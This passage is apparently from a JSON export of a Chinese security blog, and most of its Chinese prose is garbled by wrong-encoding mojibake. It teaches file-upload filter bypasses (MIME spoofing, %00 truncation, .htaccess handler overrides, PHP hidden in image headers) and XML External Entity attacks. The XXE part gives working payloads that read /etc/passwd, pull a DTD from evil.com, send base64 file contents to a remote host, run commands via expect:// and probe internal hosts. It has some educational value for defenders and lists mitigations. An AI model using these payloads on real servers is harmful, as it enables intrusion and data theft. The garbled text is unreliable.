ÂÆ¢Êà∑Á´ØjavascriptÊ£ÄÊµãÈÄöÂ∏∏Ê≠§Á±ªÊ£ÄÊµã‰ºöÂú®jsÊñá‰ª∂‰∏≠Êúâ‰∏Ä‰∏™Ê£ÄÊµãÁöÑÂáΩÊï∞Ôºå‰∏ÄËà¨ÂØπ‰∏ä‰º†ÁöÑÊñá‰ª∂ÂêéÁºÄÂêçÂÅöÊ£ÄÊµãÔºå‰æãÂ¶Ç‰ªÖÂÖÅËÆ∏‰∏ä‰º†png,jpg,gifÁ≠âÁ±ªÂûãÁöÑÊñá‰ª∂ÔºåÂ¶ÇÊûúÊ£ÄÊµãÂà∞ÁöÑÊñá‰ª∂ÂêéÁºÄÂêç‰∏çÊòØÂú®Ëøô‰∫õÂêçÂçïÂÜÖÔºåÂàô‰∏çÂêëÊúçÂä°Âô®Á´Ø‰º†ËæìÊñá‰ª∂ÂÜÖÂÆπ„ÄÇËøôÁ±ªÊ£ÄÊµã‰πüÊòØÊúÄÂÆπÊòìÁªïËøáÁöÑÊ£ÄÊµãÔºåÂèØ‰ª•‰ΩøÁî®firebug‰πãÁ±ªÁöÑÊèí‰ª∂ÊääÂÆÉÁ¶ÅÊéâÊàñËÄÖÈÄöËøáburp‰πãÁ±ªÁöÑ‰ª£ÁêÜÂ∑•ÂÖ∑ËøõË°åÁªïËøáÊèê‰∫§„ÄÇ‰ΩøÁî®burpÔºå‰∏ä‰º†Êó∂Êèê‰æõ‰∏Ä‰∏™ÁôΩÂêçÂçïÂÜÖÁöÑÂêéÁºÄÔºåÈÄöËøáburpÊã¶ÂåÖÔºåÂπ∂‰øÆÊîπÂêéÁºÄÂêéÊèê‰∫§ ÊúçÂä°Á´ØÊ£ÄÊµãÁªïËøáÔºàMIMEÁ±ªÂûãÊ£ÄÊµãÔºâ12345678910111213&lt;?php if($_FILES['userfile']['type'] != \"image/gif\") &#123; //Ê£ÄÊµãContent-type echo \"Sorry, we only allow uploading GIF images\"; exit; &#125; $uploaddir = 'uploads/'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) &#123; echo \"File is valid, and was successfully uploaded.\\n\"; &#125; else &#123; echo \"File uploading failed.\\n\"; &#125;?&gt; ‰∏äÈù¢‰∏∫phpÂêéÁ´ØÊ£ÄÊµãMIMEÁ±ªÂûãÁöÑ‰∏Ä‰∏™‰æãÂ≠êÈÄöËøáÂà§Êñ≠$_FILES[&#39;userfile&#39;][&#39;type&#39;] != &quot;image/gif&quot;Êù•‰øùËØÅ‰∏ä‰º†ÁöÑÁ±ªÂûã‰∏∫gifÁ±ªÂûãÁöÑÊñá‰ª∂„ÄÇÁªïËøáËøô‰∏ÄÁ±ªÂûãÁöÑÊ£ÄÊµãÔºåÂèØ‰ª•ÈÄöËøáburpÊã¶ÂåÖÔºåÂ∞ÜÂéüContent-TypeÁ±ªÂûãËØ•‰∏∫Á¨¶ÂêàË¶ÅÊ±ÇÁöÑimage/gifÁ±ªÂûã„ÄÇ ÊúçÂä°Á´ØÊ£ÄÊµãÁªïËøáÔºàÁõÆÂΩïË∑ØÂä≤Ê£ÄÊµãÔºâÊúâ‰∏Ä‰∫õwebÂ∫îÁî®Á®ãÂ∫èÊúâÂ§ö‰∏™Êñá‰ª∂Â§πÁî®Êù•Â≠òÂÇ®ÂõæÁâáÊñá‰ª∂ÔºåÊâÄ‰ª•‰∏∫‰∫ÜÊ†áËØÜ‰∏ä‰º†ÁöÑÂõæÁâáÊòØÂ±û‰∫éÂì™‰∏™Êñá‰ª∂Â§πÁöÑÔºå‰∏ä‰º†Êñá‰ª∂Êó∂‰ºöÂ∏¶‰∏äÊñá‰ª∂Â≠òÂÇ®Ë∑ØÂä≤„ÄÇËÄåÊ≠§Êó∂Â¶ÇÊûúÂØπÊñá‰ª∂ÁõÆÂΩïË∑ØÂä≤Ê£ÄÊµã‰∏çÂ§üÂÆåÂÖ®ÔºåÂèØ‰ª•ÈÄöËøáÊà™Êñ≠ÊîªÂáª„ÄÇÔºàÂ¶Ç%00,windows‰∏ã%80-%90ÔºâÂ¶Ç‰∏ä‰º†Êó∂Êèê‰æõÂ≠òÂÇ®Ë∑ØÂä≤‰∏∫image/20160704/ÂèØ‰ª•ÈÄöËøá‰øÆÊîπ‰∏∫image/20160704/evil.php%00Êù•ËææÂà∞Êà™Êñ≠ÁõÆÁöÑ„ÄÇÂêéÁ´ØÁ®ãÂ∫è‰ºöÂ∞ÜËØ•Ë∑ØÂä≤ËøûÊé•‰∏∫image/20160704/evil.php%00filename.gif00Êà™Êñ≠ÂØºËá¥ÊúÄÁªàÂ≠òÂÇ®ÁöÑÊñá‰ª∂Âêç‰∏∫evil.php ÊúçÂä°Âô®Á´ØÊ£ÄÊµãÁªïËøáÔºàÊñá‰ª∂Êâ©Â±ïÂêçÊ£ÄÊµãÔºâ ÈªëÂêçÂçïÊ£ÄÊµãÈªëÂêçÂçïÊ£ÄÊµãÈÄöÂ∏∏‰ºöÊúâ‰∏Ä‰∏™Êñá‰ª∂ÂêéÁºÄÂêçÈªëÂêçÂçïÔºà‰æãÂ¶Çhtml|htm|php|php2|php3|php4|php5‚Ä¶Ôºâ‰ΩÜÊòØÈÄöÂ∏∏ÈªëÂêçÂçïÊ£ÄÊµã‰∏çËÉΩÂåÖÂê´ÊâÄÊúâÁöÑÊÅ∂ÊÑèËÑöÊú¨ÂêéÁºÄÔºåÈò≤Êä§ÈöæÂ∫¶‰ºöÊØîËæÉÂ§ßÔºåÊé®Ëçê‰ΩøÁî®ÁôΩÂêçÂçïÁªïËøáÁöÑÊñπÊ≥ïÔºö Êñá‰ª∂ÂêçÂ§ßÂ∞èÂÜôÁªïËøáÔºà‰æãÂ¶ÇÁî®PhpÔºåAspÁ≠âÔºâ ÂêçÂçïÂàóË°®ÁªïËøá(Áî®ÈªëÂêçÂçï‰∏≠Êú™ÊèêÂèäÁöÑÊñá‰ª∂ÂêéÁºÄÊù•ÁªïËøáÔºåÂ¶ÇasaÔºåcerÁ≠â‰∏çÂ∏∏ËßÅÁöÑÊñá‰ª∂ÂêéÁºÄ) 0x00Êà™Êñ≠Ôºàasp‰∏ãÂèØ‰ª•Â∞ùËØï‰ΩøÁî®,asp‰∏∫‰ªéÂêéÂæÄÂâçÊâ´ÊèèÊâ©Â±ïÂêçÔºåevil.asp%00.jpgÔºå‰ºöË¢´ËØÜÂà´‰∏∫jpgÔºåÂè™Ë¶ÅÊ£ÄÊµãÊñπÂºèÂ¶ÇËøôÁßçÂèØ‰ª•ÈÄöËøáËøôÁßçÊñπÂºèÁªïËøáÔºâ ÁâπÊÆäÊñá‰ª∂ÂêçÁªïËøáÔºàÂè™ÈÄÇÁî®windowsÔºåÂ∞ÜÊñá‰ª∂ÂêçÊîπ‰∏∫evil.php.Êàñevil.php (Ê≥®ÊÑèËøôÈáåÊúâ‰∏Ä‰∏™Á©∫Ê†º),Âú®windows‰∏ãÔºå‰∏çÂÖÅËÆ∏ËøôÊ†∑ÁöÑÂëΩÂêçÔºåÊâÄ‰ª•‰ºöÂ∞Ü.ÂíåÁ©∫Ê†ºËá™Âä®ÂéªÊéâÔºâ .htaccessÊñá‰ª∂ÊîªÂáªÔºàÈÖçÂêàÂêçÂçïÂàóË°®ÁªïËøáÔºå‰∏ä‰º†‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑ.htaccessÔºåÂ∞±ÂèØ‰ª•ËΩªÊùæÁªïËøáÂêÑÁßçÊ£ÄÊµãÔºâ .htaccessÊñá‰ª∂ÊîªÂáªÂ¶ÇÊûúÈªëÂêçÂçï‰∏≠Êú™ÂåÖÂê´.htaccessÂêéÁºÄÁöÑÂèØ‰ª•ÈÄöËøáÈáçÂÜôËß£ÊûêÈÖçÁΩÆÊù•ËææÂà∞Ëß£ÊûêÁöÑÊïàÊûúÈíàÂØπphpÔºå‰∏ä‰º†Ëá™ÂÆö‰πâ.htaccess123&lt;FilesMatch &quot;haha&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; ÂêåÁõÆÂΩïÊúâ‰∏™Êàë‰ª¨‰∏ä‰º†‰∏Ä‰∏™Âè™ÊúâÊñá‰ª∂ÂêçÂπ∂ÂåÖÂê´Â≠óÁ¨¶‰∏≤‚Äùhaha‚ÄùÔºå‰ΩÜÊòØÂç¥Êó†‰ªª‰ΩïÊâ©Â±ïÂêçÁöÑÊñá‰ª∂ÈáåÈù¢ÁöÑÂÜÖÂÆπÊòØ php ‰∏ÄÂè•ËØùÊú®È©¨ÔºåÈÄöËøáËèúÂàÄËøûÊé•ÂèØ‰ª•Ëß£ÊûêphpÊàêÂõ†Ôºö Âú® PHP manual ‰∏≠ÊèêÂà∞‰∫Ü‰∏ãÈù¢‰∏ÄÊÆµËØù move_uploaded_file section, there is a warning which states ‚ÄòIf the destination file already exists, it will be overwritten.‚Äô Â¶ÇÊûú PHP ÂÆâÂÖ®Ê≤°ÈÖçÁΩÆÂ•Ω Â∞±ÂèØ‰ª•ÈÄöËøá move_uploaded_file ÂáΩÊï∞ÊääËá™Â∑±ÂÜôÁöÑ.htaccess Êñá‰ª∂Ë¶ÜÁõñÊéâÊúçÂä°Âô®‰∏äÁöÑ ËøôÊ†∑Â∞±ËÉΩ‰ªªÊÑèÂÆö‰πâËß£ÊûêÂêçÂçï‰∫Ü Ëß£ÊûêÊºèÊ¥ûÔºàapacheËß£ÊûêÊºèÊ¥ûÔºåiis6.0Ëß£ÊûêÊºèÊ¥ûÔºånginxËß£ÊûêÊºèÊ¥ûÔºâ apacheËß£ÊûêÊºèÊ¥ûapacheÊòØ‰ªéÂè≥Âà∞Â∑¶ÂºÄÂßãÂà§Êñ≠Ëß£ÊûêÔºåÂ¶ÇÊûúÊúÄÂè≥ÁöÑÂêéÁºÄÊó†Ê≥ïËß£ÊûêÔºåÂàôÂ∞ùËØïËß£ÊûêÂêé‰∏Ä‰∏™ÂêéÁºÄ iis6.0Ëß£ÊûêÊºèÊ¥û ÊàêÂõ†‰∏∫iis6.0‰∏çËß£Êûê;ÂêéÈù¢ÁöÑÔºåÊâÄ‰ª•Êèê‰∫§evil.asp;.htmlËß£Êûê‰∏∫aspÁ±ªÂûã ËøòÊúâ‰∏Ä‰∏™‰∏∫IIS6.0ÁöÑ00Êà™Êñ≠ÊîªÂáª IIS6.0ÂèåÊñá‰ª∂‰∏ä‰º† Êñá‰ª∂Â§πÁöÑÂêçÂ≠óÂåÖÂê´.aspÂàôËøô‰∏™Êñá‰ª∂Â§π‰∏ãÁöÑÊñá‰ª∂ÈÉΩ‰ª•aspÁöÑÂΩ¢ÂºèÊù•Ëß£Êûê iis7.0/7.5Ëß£ÊûêÊºèÊ¥ûÂØπ‰∫éphpÊúâ‰∏Ä‰∏™Á±ª‰ººNginxÁöÑËß£ÊûêÊºèÊ¥ûevil.jpg/evil.php Ëß£Êûêevil.jpg‰∏≠ÁöÑphp‰ª£Á†ÅÔºåËøô‰∏™ÊºèÊ¥ûÊàêÂõ†Âú®‰∫éphp-cgiÁöÑÊºèÊ¥û nginxËß£ÊûêÊºèÊ¥û Â∞ÜphpÊñá‰ª∂Êç¢ÊàêÂÖ∂‰ªñÂèØ‰ª•ÈÄöËøáÁöÑÊñá‰ª∂ÂêéÁºÄÔºåËÆøÈóÆÁöÑÊó∂ÂÄôÂú®ÂêéÈù¢Âä†‰∏ä/.phpÔºåÂç≥evil.jpg/.phpÔºåevil.jpg‰ºöËß£Êûê‰∏∫phpÁöÑÊ†ºÂºè %00Êà™Êñ≠ ÂÖ∂‰ªñÊñπÂºèÊèê‰∫§ÂâçÂ∞Üfilename=‚Äùevil.php‚ÄùËØ•‰∏∫‚Äùevil.php‚Äù.jpg‚Äù ÁôΩÂêçÂçïÊ£ÄÊµã 0x00Êà™Êñ≠ÁªïËøá Ëß£ÊûêÊºèÊ¥ûÁªïËøáÔºàÊñá‰ª∂Âêç‰∏çË¢´ÈáçÂÜôÔºâ ÊúçÂä°Âô®Á´ØÊ£ÄÊµãÁªïËøáÔºàÊñá‰ª∂ÂÜÖÂÆπÊ£ÄÊµãÔºâÂõæÂÉèÁ±ªÁöÑÊñá‰ª∂ÂÜÖÂÆπÊ£ÄÊµã Êñá‰ª∂ÂπªÊï∞Ê£ÄÊµãÔºàÂõæÁâáÂ§¥Ê†ºÂºèÊ£ÄÊµãÔºâjpgÂÜÖÂÆπÂ§¥value= FF D8 FF E0 00 10 4A 46 49 46gifÂÜÖÂÆπÂ§¥value= 47 49 46 38 39 61pngÂÜÖÂÆπÂ§¥value= 89 50 4E 47 Âú®Êñá‰ª∂Â§¥ÂêéÂä†‰∏ä‰∏ÄÂè•ËØùÊú®È©¨Â∞±ËÉΩÁªïËøá Êñá‰ª∂Áõ∏ÂÖ≥‰ø°ÊÅØÊ£ÄÊµã ÂõæÂÉèÊñá‰ª∂Áõ∏ÂÖ≥‰ø°ÊÅØÊ£ÄÊµãÂ∏∏Áî®ÁöÑÂ∞±ÊòØphpÁöÑgetimagesize()ÂáΩÊï∞ÔºåÂèØ‰ª•ÈÄöËøá‰øÆÊîπÂõæÁâáÁöÑÊ≥®ÈáäÂå∫ÔºàdataÂå∫ÔºâÊèíÂÖ•‰∏ÄÂè•ËØù‰ª£Á†ÅÔºåÂ¶Ç‰∏ãÔºö1234GIF89a(...some binary data for image...)&lt;?php phpinfo(); ?&gt;(... skipping the rest of binary data ...) Êñá‰ª∂Âä†ËΩΩÊ£ÄÊµã Ë∞ÉÁî®APIÊàñÂáΩÊï∞ÂéªËøõË°åÊñá‰ª∂Âä†ËΩΩÊµãËØïÔºåÂ∏∏ËßÅÁöÑÊòØÂõæÂÉèÊ∏≤ÊüìÊµãËØïÔºå‰∫åÊ¨°Ê∏≤ÊüìÔºåÂèØ‰ª•ÈÄöËøá‰∏ä‰º†ÊÅ∂ÊÑèÊñá‰ª∂ÔºåÂÜç‰∏ãËΩΩ‰∏ãÊù•Ôºådiff‰∏Ä‰∏ãÊâæÂà∞‰∏çÂèòÁöÑ‰ΩçÁΩÆÊèíÂÖ•‰∏ÄÂè•ËØùÊú®È©¨Ôºå‰ΩÜÊàêÂäüÁéá‰∏çÈ´ò ÊÄªÁªìËΩªÈáèÁ∫ßÊ£ÄÊµãÁªïËøáÊîªÂáª ÁªïËøá javascript ÂØπÊâ©Â±ïÂêçÁöÑÊ£ÄÊµã &lt;Áî® burp ‰πãÁ±ªÁöÑÂèçÂêë‰ª£ÁêÜÂ∑•ÂÖ∑Áõ¥Êé• POST Êï∞ÊçÆÂåÖÂà∞ÊúçÂä°Á´ØÔºåÁªïËøáÂâçÁ´ØÊ£ÄÊµã&gt; ÁªïËøáÊúçÂä°Á´ØÂØπ http request ÂåÖ MIME Á±ªÂûãÊ£ÄÊµã &lt;Áî® burp ‰πãÁ±ªÁöÑÂèçÂêë‰ª£ÁêÜÂ∑•ÂÖ∑‰º™ÈÄ† POST Êï∞ÊçÆÂåÖÂà∞ÊúçÂä°Á´ØÔºåÁªïËøá MIME Ê£ÄÊµã&gt; Ë∑ØÂæÑ/Êâ©Â±ïÂêçÊ£ÄÊµãÁªïËøáÊîªÂáª ÈªëÂêçÂçïÁªïËøá Êñá‰ª∂ÂêçÂ§ßÂ∞èÂÜôÁªïËøá ÂêçÂçïÂàóË°®ÁªïËøá ÁâπÊÆäÊñá‰ª∂ÂêçÁªïËøá 0x00 Êà™Êñ≠ÁªïËøá .htaccess Êñá‰ª∂ÊîªÂáª Êú¨Âú∞ÂåÖÂê´ÊºèÊ¥û Apache Ëß£ÊûêÊºèÊ¥û IIS Ëß£ÊûêÊºèÊ¥û Nginx Ëß£ÊûêÊºèÊ¥û ÁôΩÂêçÂçïÁªïËøá 0x00 Êà™Êñ≠ÁªïËøá Êú¨Âú∞Êñá‰ª∂ÂåÖÂê´ÊºèÊ¥û IIS Ëß£ÊûêÊºèÊ¥û Nginx Ëß£ÊûêÊºèÊ¥û Êñá‰ª∂ÂÜÖÂÆπÊ£ÄÊµãÁªïËøáÊîªÂáª Êñá‰ª∂Âä†ËΩΩÊµãËØïÁªïËøá&lt;ÂØπÊñá‰ª∂ËøõË°å‰ª£Á†ÅÊ≥®ÂÖ•ÂÜçÈÖçÂêà‰ªªÊÑèËß£ÊûêË∞ÉÁî®/ÊºèÊ¥û&gt;"},{"title":"„ÄêVULNERABLITY„ÄëXML External Entity(XXE)","permalink":"http://blog.0kami.cn/2016/06/28/old-old-xxe/","text":"ÊèèËø∞XMLÁöÑ‰∏Ä‰∫õÂü∫Á°ÄÁü•ËØÜÔºåÊëòËá™security.tencent.comXML‰æãÂ≠ê1234567891011121314&lt;?xml version=\"1.0\" ?&gt; xmlÂ£∞Êòé&lt;!DOCTYPE note[ ÊñáÊ°£Á±ªÂûãÂÆö‰πâ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; ÊñáÊ°£ÂÖÉÁ¥†&lt;to&gt;George&lt;/to&gt;&lt;from&gt;John&lt;/from&gt;&lt;heading&gt;Test&lt;/heading&gt;&lt;body&gt;This is a Test&lt;/body&gt;&lt;/note&gt; ‰∏äËø∞‰∏∫‰∏Ä‰∏™XMLÁöÑÂÆû‰æãDTDÔºàÊñáÊ°£Á±ªÂûãÂÆö‰πâÔºâÁöÑ‰ΩúÁî®ÊòØÂÆö‰πâ XML ÊñáÊ°£ÁöÑÂêàÊ≥ïÊûÑÂª∫Ê®°Âùó„ÄÇDTD ÂèØ‰ª•Âú® XML ÊñáÊ°£ÂÜÖÂ£∞ÊòéÔºå‰πüÂèØ‰ª•Â§ñÈÉ®ÂºïÁî®„ÄÇ ÂÜÖÈÉ®Â£∞ÊòéDTD&lt;!DOCTYPE Ê†πÂÖÉÁ¥† [ÂÖÉÁ¥†Â£∞Êòé]&gt; ÂºïÁî®Â§ñÈÉ®DTD&lt;!DOCTYPE Ê†πÂÖÉÁ¥† SYSTEM &quot;Êñá‰ª∂Âêç&quot;&gt;ÊàñËÄÖ&lt;!DOCTYPE Ê†πÂÖÉÁ¥† PUBLIC &quot;public_ID&quot; &quot;Êñá‰ª∂Âêç&quot;&gt;DTDÂÆû‰ΩìÊòØÁî®‰∫éÂÆö‰πâÂºïÁî®ÊôÆÈÄöÊñáÊú¨ÊàñÁâπÊÆäÂ≠óÁ¨¶ÁöÑÂø´Êç∑ÊñπÂºèÁöÑÂèòÈáèÔºåÂèØ‰ª•ÂÜÖÈÉ®Â£∞ÊòéÊàñÂ§ñÈÉ®ÂºïÁî®„ÄÇ ÂÜÖÈÉ®Â£∞ÊòéÂÆû‰Ωì&lt;!ENTITY ÂÆû‰ΩìÂêçÁß∞ &quot;ÂÆû‰ΩìÁöÑÂÄº&quot;&gt; ÂºïÁî®Â§ñÈÉ®ÂÆû‰Ωì&lt;!ENTITY ÂÆû‰ΩìÂêçÁß∞ SYSTEM &quot;URI&quot;&gt;ÊàñËÄÖ&lt;!ENTITY ÂÆû‰ΩìÂêçÁß∞ PUBLIC &quot;public_ID&quot; &quot;URI&quot;&gt; ÊºèÊ¥ûÊèèËø∞ÊëòËá™OWASP1An XML External Entity attack is a type of attack against an application that parses XML input. This attack occurs when XML input containing a reference to an external entity is processed by a weakly configured XML parser. This attack may lead to the disclosure of confidential data, denial of service, server side request forgery, port scanning from the perspective of the machine where the parser is located, and other system impacts. ÊºèÊ¥ûÊàêÂõ†‰∏∫XMLËß£ÊûêÂô®ÈÖçÁΩÆ‰∏çÂÆâÂÖ®Êó∂ÔºåÂΩìÂÖÅËÆ∏ÂºïÁî®Â§ñÈÉ®ÂÆû‰ΩìÊó∂ÔºåÈÄöËøáÊûÑÈÄ†ÊÅ∂ÊÑèÂÜÖÂÆπÔºåÂèØÂØºËá¥ËØªÂèñ‰ªªÊÑèÊñá‰ª∂„ÄÅÊâßË°åÁ≥ªÁªüÂëΩ‰ª§„ÄÅÊé¢ÊµãÂÜÖÁΩëÁ´ØÂè£„ÄÅÊîªÂáªÂÜÖÁΩëÁΩëÁ´ôÁ≠âÂç±ÂÆ≥„ÄÇ ËØïÈ™åÊÅ∂ÊÑèÂºïÂÖ•Â§ñÈÉ®ÂÆû‰ΩìÊñπÂºèÔºö Êú¨Âú∞Êñá‰ª∂ËØªÂèñ 12345&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt; ËøúÁ®ãÊñá‰ª∂ËØªÂèñ 12345678&lt;?xml version=\"1.0\" ?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % d SYSTEM \"http://evil.com/evil.dtd\"&gt; %d;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;ÂÖ∂‰∏≠evil.dtdÊñá‰ª∂ÂÜÖÂÆπ&lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt; ‰ΩÜÊòØÂ¶ÇÊûúÈÅáÂà∞ËØªÂèñÂ§öË°åÁöÑÊñá‰ª∂ÔºåÂèØËÉΩ‰ºöËØª‰∏çÂá∫Êù•ÔºåËøôÈáåÂèØ‰ª•Áúã‰∏Ä‰∏ãftpÊé•ÂèóxxeÊï∞ÊçÆ‰∏çÂêåÁöÑËØ≠Ë®ÄÈªòËÆ§ÊîØÊåÅÁöÑÂçèËÆÆ‰∏çÂêå libxml2 php java .net filehttpftp filehttpftpphpcompress.zipcompress.bzip2dataglobphar httphttpsftpfilejarnetdocmailtogopher * httpfilehttpsftp ‰∏äËø∞‰∏∫ÈªòËÆ§ÊîØÊåÅÂçèËÆÆÔºåËøòÂèØ‰ª•ÈÄöËøáÊâ©Â±ïÊîØÊåÅÂÖ∂‰ªñÂçèËÆÆÔºåÂ¶Çphp scheme extension required httpsftps openssl zip zip ssh2.shellssh2.execssh2.tunnelssh2.sftpssh2.scp ssh2 rar rar ogg oggvorbis expect expect demo1 ‰ªªÊÑèËØªÂèñÊú¨Âú∞Êñá‰ª∂123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"file:///etc/passwd\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; demo2 ‰∏çÂõûÊòæËØªÂèñÂÜÖÂÆπÔºåËøúÁ®ã‰º†ÈÄíÊï∞ÊçÆ1234567891011121314$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY % file SYSTEM \"php://filter/read=convert.base64-encode/resource=/etc/issue\"&gt; &lt;!ENTITY % dtd SYSTEM \"http://ip/evil.dtd\"&gt; %dtd; %send;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);ËøúÁ®ãDTDÊñá‰ª∂ÂÜÖÂÆπ&lt;!ENTITY % all \"&lt;!ENTITY &amp;#x25 send SYSTEM 'http://ip/?xml=%file;'&gt;\"&gt;%all; demo3 ÊâßË°åÁ≥ªÁªüÂëΩ‰ª§123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"expect://id\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; ÊâßË°åÊàêÂäüÈúÄË¶ÅphpÁöÑexpectÊâ©Â±ï demo4 Êé¢ÊµãÂÜÖÁΩëÂ∫îÁî®123456789$xml=&lt;&lt;&lt;EOF&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE ANY [ &lt;!ENTITY b SYSTEM \"http://192.168.1.20:80\"&gt;]&gt;&lt;c&gt;&amp;b;&lt;/c&gt;EOF;$data=simplexml_load_string($xml);echo $data; Â¶ÇÊûú‰∏çÂ≠òÂú®ËØ•ipÁöÑÂ∫îÁî®Ôºå‰ºöÊúâwarning failed to open streamÔºåÈÄöËøáËøôÁßçÊñπÂºèÊé¢ÊµãÂÜÖÂÆπÂ∫îÁî®ÂêåÊó∂Â¶ÇÊûúÊâæÂà∞‰∫ÜÂÜÖÂÆπÂ∫îÁî®ÔºåÂèØ‰ª•ÈÄöËøáËøôÁßçÊñπÂºèÊîªÂáªÂÜÖÁΩëÂ∫îÁî® Èò≤Âæ°ÊñπÊ°à‰∏Ä„ÄÅ‰ΩøÁî®ÂºÄÂèëËØ≠Ë®ÄÊèê‰æõÁöÑÁ¶ÅÁî®Â§ñÈÉ®ÂÆû‰ΩìÁöÑÊñπÊ≥ï PHPÔºölibxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); PythonÔºöfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) ÊñπÊ°à‰∫å„ÄÅËøáÊª§Áî®Êà∑Êèê‰∫§ÁöÑXMLÊï∞ÊçÆÂÖ≥ÈîÆËØçÔºö&lt;!DOCTYPEÂíå&lt;!ENTITYÔºåÊàñËÄÖÔºåSYSTEMÂíåPUBLIC„ÄÇ jsonËäÇÁÇπÁöÑContent-Type XXEÊîªÂáªÂ¶Ç‰ªäÂæàÂ§öwebÂ∫îÁî®Á®ãÂ∫è‰ΩøÁî®ÁöÑÈÉΩÊòØjsonÊ†ºÂºèÁöÑÊï∞ÊçÆ‰º†ÈÄíÔºåÈÄöËøáÂú®http requestÂ§¥‰∏≠Â∏¶ÂÖ•Content-Type: application/jsonË°®Êòé‰º†ÈÄíÁöÑÊòØjsonÊ†ºÂºèÁöÑÊï∞ÊçÆ„ÄÇ‰ΩÜÊòØÊúâÊó∂ÂÄôÊúçÂä°Âô®ÂèØ‰ª•Êé•ÂèóÂºÄÂèë‰∫∫ÂëòÊ≤°ÊúâÊÑèÊñôÂà∞ÁöÑÂÖ∂‰ªñÊï∞ÊçÆÊ†ºÂºèÔºåÂ¶ÇxmlÊ†ºÂºè„ÄÇÂ¶ÇÊûúÊúçÂä°Âô®ÂèØ‰ª•Êé•ÂèóxmlÊ†ºÂºèÁöÑÊï∞ÊçÆÔºåÈÇ£‰πàÂ∞±ÊúâÂèØËÉΩÂ≠òÂú®xxe„ÄÇ1234567891011121314151617HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/jsonContent-Length: 38&#123;&quot;search&quot;:&quot;name&quot;,&quot;value&quot;:&quot;netspitest&quot;&#125;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; Â∞ÜÂ¶Ç‰∏äÁöÑContent-TypeÊîπ‰∏∫xmlÊ†ºÂºèÁöÑÂÜçÂèëÈÄÅ123456789101112131415161718192021HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 112&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;netspitest&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 43&#123;&quot;error&quot;: &quot;no results for name netspitest&quot;&#125; Â¶ÇÊûúËøîÂõûÁöÑÊï∞ÊçÆÊòØ‰∏ÄÊ†∑ÁöÑÔºåÈÇ£‰πàÂ∞±ËØ¥ÊòéÊúçÂä°Âô®ÂèØ‰ª•Êé•ÂèóxmlÊ†ºÂºèÁöÑÊï∞ÊçÆÔºåÈÇ£‰πàÊàë‰ª¨Â∞±ÂèØ‰ª•Âà©Áî®xxeÊù•ÊîªÂáª1234567891011121314151617181920212223242526HTTP Request:POST /netspi HTTP/1.1Host: someserver.netspi.comAccept: application/jsonContent-Type: application/xmlContent-Length: 288&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;root&gt;&lt;search&gt;name&lt;/search&gt;&lt;value&gt;&amp;xxe;&lt;/value&gt;&lt;/root&gt;HTTP Response:HTTP/1.1 200 OKContent-Type: application/jsonContent-Length: 2467&#123;&quot;error&quot;: &quot;no results for name root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/sync.... ‰ΩÜÊòØÂπ∂‰∏çÊòØÊâÄÊúâÁöÑjsonËäÇÁÇπÈÉΩÊòØÊé•ÂèóxmlÊ†ºÂºèÁöÑÊï∞ÊçÆÁöÑ„ÄÇÊúâÂèØËÉΩËøîÂõûËß£ÊûêÈîôËØØÁöÑÊèêÁ§∫ÊàñËÄÖ415‰∏çÊîØÊåÅÂ™í‰ΩìÁ±ªÂûãÁöÑÈîôËØØÊ∂àÊÅØ Â∏¶‰∏ä‰∏Ä‰∏™xxe-cheat-sheetÔºåDTD-AttacksÂèÇËÄÉsecurity.tencent.comÔºå91ri.org"},{"title":"„ÄêCTF„ÄëBCTF Crypto SpecialRSA 